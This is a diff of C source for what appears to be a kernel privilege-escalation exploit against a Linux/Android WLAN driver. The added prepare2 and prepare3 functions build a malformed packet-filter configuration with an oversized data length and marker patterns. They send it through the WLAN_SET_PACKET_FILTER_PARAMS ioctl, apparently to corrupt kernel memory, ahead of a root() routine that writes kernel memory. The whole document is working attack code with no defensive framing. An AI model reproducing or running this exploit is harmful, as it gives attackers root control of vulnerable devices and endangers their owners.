@@ -11,8 +11,7 @@
 #include <sys/mman.h>
 #include <linux/kernel.h>
 #include <net/if.h>
-//#include "structs.h"
-//#include "wlan_hdd_packet_filtering.h"
+#include "structs.h" 
 
 
 int write_kernel(void* kernel_addr, void* process_addr, int size){
@@ -129,6 +128,7 @@ int prepare(){
 	//sub_443C10(1, 2, NULL);
 	/*
 	./iwpriv
+	//WLAN_SET_PACKET_FILTER_PARAMS
 	setPktFilter     (8BF7) : set 103 byte  & get   0
 	*/
 	
@@ -251,13 +251,18 @@ int prepare(){
 	return 0;
 }
 
+
 void prepare2(){
+	int ret;
 	int fd ;
 	struct ifreq req;
 	char data[32]={0};//sp+0x3470
 	char data2[0x1000] = {0};//sp+0x2470
+	unsigned int n0;
+	unsigned int n1;
+	char* ptr0;
+	int n2;
 	
-	fd = socket(2, 1, 0);
 	
 	printf("req=%ld\n", sizeof(req));//40
 	printf("req.ifr_name=%ld\n", sizeof(req.ifr_name));//16
@@ -267,12 +272,124 @@ void prepare2(){
 	printf("req.ifr_ifru.ifru_data=%ld\n", sizeof(req.ifr_ifru.ifru_data));//8
 	printf("req.ifr_ifru.ifru_settings=%ld\n", sizeof(req.ifr_ifru.ifru_settings));//16
 	
+	fd = socket(2, 1, 0);
+	
 	*((unsigned long int*)data) = 0;
 	*((unsigned long int*)data + 1) = 0;
 	*((unsigned long int*)data + 2) = 0;
 	*((unsigned long int*)data + 3) = 0;
 	
 	memset(data2, 0, 0x1000);
+	//identify_current_device();
+	memset(data2+8, 'A', 0x1000-8);
+	
+	n0 = 0;
+	n1 = 0x13370000;
+	ptr0 = (char*)(data2 + 0xB);
+	do{//loc_401BFC
+		*( unsigned int *)( ptr0 + n0 ) = n1 + n0;
+		n0 = n0 + 4;
+	}while( n0 < 0xFF8 );
+	
+	*(unsigned int*)data = 0x6E616C77;
+	*(data+4) = 0x30;		//wlan0
+	*(void**)(data+0x10) = data2;
+	*(unsigned short*)(data+0x18) = 0x1000;
+	*(unsigned short*)(data+0x1A) = 0;
+	
+	*(unsigned short int*)data2  = 0x1;
+	*(data2+2) = 0x4;
+	
+	 ptr0 = data2+6;
+	 n2 = 0;
+	 do{//loc_401C60
+		*ptr0 = 0;
+		ptr0 = ptr0 + 0x14; 
+		n2 = n2 + 1;
+	 }while( n2 < *(data2+2) - 1);
+	 *ptr0 = 0xD4;
+	 
+	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x30) ) ){
+		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
+	}
+	printf("[++] ioctl wlan0 ret=%d\n", ret);
+	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x889) ) ){
+		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
+	}
+	printf("[++] ioctl wlan0 ret=%d\n", ret);
+	
+	
+}
+
+void print_chars(char* chs, int size){
+	int i;
+	printf("%p:", chs);
+	for(i=0; i<size; i++){
+		printf("%x ", *(chs+i));
+	}
+	printf("\n");
+}
+
+void prepare3(){
+	int ret;
+	int fd ;
+	struct tPacketFilterCfg cfg;
+	struct ifreq ifr;
+	char* ptr0;
+	unsigned int n0;
+	unsigned int n1;
+	
+	//cfg init
+	memset(&cfg, 0, 8);
+	memset((char*)(&cfg)+8, 'A', sizeof(cfg)-8);
+	
+	ptr0 = (char*)&cfg + 0xB;
+	n0 = 0;
+	n1 = 0x13370000;
+	do{//loc_401BFC
+		*( unsigned int *)( ptr0 + n0 ) = n1 + n0;
+		n0 = n0 + 4;
+	}while( n0 < 0xFF8 );
+	
+	cfg.filterAction = 0x1;
+	cfg.filterId = 0x0;
+	cfg.numParams = 0x4;
+	
+	n0 = 0;
+	do{
+		cfg.paramsData[n0++].dataLength = 0;
+	}while( n0 < cfg.numParams-1 );
+	cfg.paramsData[n0++].dataLength = 0xD4;
+	
+	//ifr init
+	memset(&ifr, 0, sizeof(ifr));
+	
+	strcpy(ifr.ifr_ifrn.ifrn_name, "wlan0");
+	ifr.ifr_ifru.ifru_data = &cfg;
+	*(unsigned int*)( (char*)&ifr.ifr_ifru.ifru_data + sizeof(void*) ) = 0x1000;
+	
+	//exploy
+	fd = socket(2, 1, 0);
+	
+	if( -1 == ( ret = ioctl(3, WLAN_SET_PACKET_FILTER_PARAMS, &ifr, 0x30) ) ){
+		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
+	}
+	printf("[++] ioctl wlan0 ret=%d\n", ret);
+	if( -1 == ( ret = ioctl(3, WLAN_SET_PACKET_FILTER_PARAMS, &ifr, 0x889) ) ){
+		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
+	}
+	printf("[++] ioctl wlan0 ret=%d\n", ret);
+	
+	//验证
+	print_chars( (char*)&ifr, 16 );
+	print_chars( (char*)&ifr.ifr_ifru.ifru_data, sizeof(ifr)-16);
+	
+	print_chars( (char*)&cfg, 3);
+	print_chars( (char*)&cfg+23, 20);
+	print_chars( (char*)&cfg+43, 20);
+	print_chars( (char*)&cfg+63, 20);
+	print_chars( (char*)&cfg+83, 20);
+	print_chars( (char*)&cfg+103, 20);
 }
 
 void root(){
@@ -281,7 +398,8 @@ void root(){
 	int size = -1;
 	
 	//prepare();
-	prepare2();
+	//prepare3();
+	prepare3();
 	
 	kernel_data = (char*)malloc(0x4000);
 	printf("[+] kernel_data=%p\n", kernel_data);
